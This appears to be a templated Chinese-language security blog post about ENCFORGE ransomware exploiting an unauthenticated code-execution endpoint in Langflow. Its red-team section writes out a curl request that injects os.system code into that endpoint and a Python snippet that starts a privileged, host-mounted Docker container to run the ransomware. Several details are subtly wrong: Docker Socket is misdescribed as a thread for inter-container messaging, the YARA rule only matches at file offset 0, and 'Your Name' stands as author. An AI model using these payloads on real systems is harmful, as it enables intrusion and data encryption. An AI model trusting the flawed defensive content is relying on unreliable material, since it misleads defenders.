---
layout: post
title:  "New ENCFORGE Ransomware Targets AI Model Files in Langflow RCE Attack"
date:   2026-07-21 08:12:23 +0000
categories: [security]
severity: critical
---

# 🚨 解析 JADEPUFFER 攻擊：ENCFORGE 勒索軟體對 AI 基礎設施的威脅
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: AES-256-CTR 加密、RSA-2048 公鑰加密、Docker Socket 滲透

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Langflow 版本在 1.3.0 之前的 `/api/v1/validate/code` 端點沒有進行身份驗證，允許遠端攻擊者在伺服器上執行任意 Python 代碼。
* **攻擊流程圖解**:
  1. 攻擊者通過 Langflow 的 RCE 漏洞執行任意 Python 代碼。
  2. 攻擊者使用 Python 代碼創建和修訂多個腳本，以便在目標主機上執行 ENCFORGE 勒索軟體。
  3. 攻擊者使用 Docker API 在目標主機上創建一個具有特權的容器，並將 ENCFORGE 勒索軟體複製到容器中。
  4. 攻擊者使用 `nsenter` 執行 ENCFORGE 勒索軟體，對主機上的 AI 基礎設施文件進行加密。
* **受影響元件**: Langflow 版本在 1.3.0 之前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Langflow 的 RCE 權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import base64
    
    # 導入 ENCFORGE 勒索軟體
    encforge = "/path/to/encforge"
    
    # 創建一個具有特權的容器
    container = "docker run -it --privileged --pid=host --net=host -v /:/host:rw encforge"
    
    # 執行 ENCFORGE 勒索軟體
    os.system(f"{container} {encforge}")
    
    ```
  * **範例指令**: `curl -X POST -H "Content-Type: application/json" -d '{"code": "import os; os.system(\"/path/to/encforge\")"}' http://langflow-server:8080/api/v1/validate/code`
* **繞過技術**: 攻擊者可以使用 Docker Socket 滲透和 `nsenter` 執行 ENCFORGE 勒索軟體，以繞過目標主機上的安全防護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 8cb0c223b018cecef1d990ec81c67b826eb3c30d54f06193cf69969e9a8baea2 |  |  | /path/to/encforge |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Encforge_Detection {
      meta:
        description = "Detects Encforge ransomware"
        author = "Your Name"
      strings:
        $encforge_string = "Encforge"
      condition:
        $encforge_string at 0
    }
    
    ```
  * **SIEM 查詢語法**: `search index=langflow_logs (eventtype="docker_container_create" OR eventtype="nsenter_execution")`
* **緩解措施**:
  + 升級 Langflow 至 1.9.1 或更高版本。
  + 對 AI 基礎設施文件進行加密和備份。
  + 限制 Docker Socket 的存取權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **AES-256-CTR**: 一種對稱加密演算法，使用 256 位元的金鑰和 CTR 模式進行加密。
* **RSA-2048**: 一種非對稱加密演算法，使用 2048 位元的金鑰進行加密。
* **Docker Socket**: 一種 Unix 執行緒，允許 Docker 容器之間進行通信。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/new-encforge-ransomware-targets-ai.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


